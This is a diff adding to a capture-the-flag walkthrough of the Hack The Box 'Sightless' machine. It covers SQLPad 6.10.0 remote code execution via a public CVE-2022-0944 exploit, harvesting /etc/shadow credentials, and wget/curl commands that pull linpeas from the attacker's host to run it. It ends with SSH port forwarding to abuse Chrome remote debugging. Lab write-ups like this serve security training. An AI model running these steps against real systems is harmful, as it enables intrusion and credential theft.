@@ -5,7 +5,7 @@
 Sightless IP Address:           10.10.11.32
 Sightless domain:               sightless.htb
 
-My (Attacker) IP address:       10.10.16.13
+My (Attacker) IP address:       10.10.16.3
 
 Command used to connect to VPN: `sudo openvpn LAB_VPN`
 
@@ -90,6 +90,43 @@ SSH is a secure way to access the server, but we don't have the credentials to l
 
 ### Visiting the website
 
+Before visiting the website, we can see that in the nmap scan above, there is a line `http-title: Did not follow redirect to http://sightless.htb/`. This line indicates that the domain for the IP address that we have is **sightless.htb**. So, based on this information we can add the line `10.10.11.32  sightless.htb` into the `/etc/hosts` file. By adding this line, we can just input **sightless.htb** into our browser to visit the site that is being hosted by the victim machine.
+
+Once that is done, we can now visit the website. Visiting the website does not provide much information, but there are a few links that brings us to interesting pages. One of the links in their Services section brings us to Sqlpad. Once we're in the sqlpad page, we can see that find the version of Sqlpad that is running though its About page, which is version 6.10.0.
+
+![Sqlpad version](./Screenshots/Sightless%20sqlpad%20version.png)
+
 ## Exploitation
 
+By searching the internet for exploits targeting Sqlpad version 6.10.0, there is one exploit from 0xRoqeeb that allows for RCE ([GitHub](https://github.com/0xRoqeeb/sqlpad-rce-exploit-CVE-2022-0944)). Using this script, we can establish a reverse connection to the Sqlpad instance that is running on the victim machine.
+
+Once the reverse connection is established, we can start performing further enumeration and possibly privilege escalation. Digging through the directories and files, we can find that we are already `root` and have read access to `/etc/shadow` file. This means that we can read the hashed passwords of all users on the system.
+
+Going through `/etc/shadow`, we retrieved the passwords for (listed in the format username:password):
+
+1. root:blindside
+2. michael:insaneclownposse
+
+With these usernames and passwords, we can now try to SSH into the victim machine using these credentials. However, only `michael`'s user:pass combination worked. Once logged in as michael, we can retrieve the user flag, which is found in `michael`'s home directory.
+
+However, `michael` does not have administrator or root privileges, so we need to find another way to escalate privileges to find the root flag. To find a foothold, we can first bring in `linpeas.sh` to the victim machine, which is useful to find privilege escalation opportunities. To bring in the `linpeas.sh` script, we can first host a python server from the attacker's machine and then use `curl` or `wget` in the victim machine to download the script. The overall steps are as below:
+
+1. Go to the directory that has the `linpeas.sh` script on the attacker's machine.
+2. Run `python3 -m http.server PORT_NUMBER`, PORT_NUMBER can be any unused port on the attacker's machine.
+3. Go to `michael`'s session that was previously established
+4. Go to a directory where you have write access.
+5. Run `wget http://10.10.16.3:8880/linpeas.sh -o linpeas.sh` or `curl http://10.10.16.3:8880/linpeas.sh -o linpeas.sh`, 10.10.16.3 is my machine's (attacker) IP address and the port that is hosting HTTP server using command 2 is 8880.
+6. Run `chmod +x linpeas.sh` to make the script executable.
+7. Run `./linpeas.sh` to run the script on the victim machine.
+
+It will take some time for the script to fully execute, but once it is done, we will need to go through the results to find a possible entry point to gain root privileges. Based on the results, it seems that one of the users on the victim machine is running remote debugging using Chrome and linpeas is flagging it as a possible entry point.
+
+![Chrome Remote Debugging as Entry Point](./Screenshots/Priv%20Esc%20through%20Chrome%20Remote%20Debugging.png)
+
 ## Privilege Escalation
+
+Based on the information from `linpeas`, we can deduce that we will be somehow using Chrome's Remote Debugging feature to perform the privilege escalation. Further investigation through the internet shows that there are ways to abuse that feature. Below is the link that I referenced:
+
+1. [Chrome Remote Debugger Pentesting](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/chrome-remote-debugger-pentesting/)
+
+Following the steps on the resource above, the command that was used to perform port forwarding to the attacker machine was `ssh -L LOCAL_PORT:localhost:REMOTE_PORT michael@sightless.htb` where LOCAL_PORT is an unused port on the attacker machine while REMOTE_PORT is a port that is serving or hosting some service on the victim machine.
